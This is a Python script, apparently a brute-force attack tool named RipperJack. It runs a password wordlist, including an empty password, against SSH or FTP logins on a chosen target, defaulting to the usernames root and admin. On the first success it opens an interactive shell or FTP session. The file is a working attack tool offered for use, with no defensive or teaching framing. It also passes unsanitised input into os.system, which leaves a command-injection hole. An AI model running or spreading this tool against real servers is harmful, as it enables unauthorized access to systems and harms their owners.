import argparse
import paramiko
import ftplib
import threading
import time
import os
import sys

MAX_THREADS = 3  # Limit concurrent connections

def ssh_brute_force(target, usernames, wordlist):
    try:
        with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f]
        passwords.insert(0, "")  # Include null password attempt

        def attempt_ssh(username, password):
            print(f"Trying SSH login {username}:{password if password else '(empty)'}", flush=True)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(target, username=username, password=password, timeout=2)
                print(f"\n[+] Password successful! {username}:{password if password else '(empty)'}", flush=True)
                print("Connecting to SSH...\n", flush=True)
                os.system(f"ssh {username}@{target}")
                return True
            except paramiko.AuthenticationException:
                pass  # No output for failed login
            except Exception:
                pass  # No output for null login
            finally:
                client.close()
            return False

        threads = []
        for username in usernames:
            for password in passwords:
                if threading.active_count() >= MAX_THREADS:
                    time.sleep(0.2)
                t = threading.Thread(target=attempt_ssh, args=(username, password))
                t.start()
                threads.append(t)

        for t in threads:
            t.join()

        print("All passwords have been tried.", flush=True)

    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting RipperJack.", flush=True)
        sys.exit(0)

def ftp_brute_force(target, usernames, wordlist):
    try:
        with open(wordlist, "r") as f:
            passwords = [line.strip() for line in f]
        passwords.insert(0, "")  # Include null password attempt

        def attempt_ftp(username, password):
            print(f"Trying FTP login {username}:{password if password else '(empty)'}", flush=True)
            try:
                ftp = ftplib.FTP(target)
                ftp.login(username, password)
                print(f"\n[+] Password successful! {username}:{password if password else '(empty)'}", flush=True)
                print("Connecting to FTP...\n", flush=True)
                ftp.quit()
                os.system(f"ftp {target}")
                return True
            except ftplib.error_perm:
                pass  # No output for failed login
            except Exception:
                pass  # No output for null login
            return False

        threads = []
        for username in usernames:
            for password in passwords:
                if threading.active_count() >= MAX_THREADS:
                    time.sleep(0.2)
                t = threading.Thread(target=attempt_ftp, args=(username, password))
                t.start()
                threads.append(t)

        for t in threads:
            t.join()

        print("All passwords have been tried.", flush=True)

    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting RipperJack.", flush=True)
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RipperJack - Brute-force attack tool, Written by SQU1DMAN")
    parser.add_argument("protocol", choices=["ssh", "ftp"], help="Target protocol (ssh or ftp)")
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument("--wordlist", required=True, help="Path to the password wordlist")
    parser.add_argument("--username", nargs="*", help="Username(s) to attack (default: root, admin)")

    args = parser.parse_args()
    usernames = args.username if args.username else ["root", "admin"]

    if args.protocol == "ssh":
        ssh_brute_force(args.target, usernames, args.wordlist)
    elif args.protocol == "ftp":
        ftp_brute_force(args.target, usernames, args.wordlist)
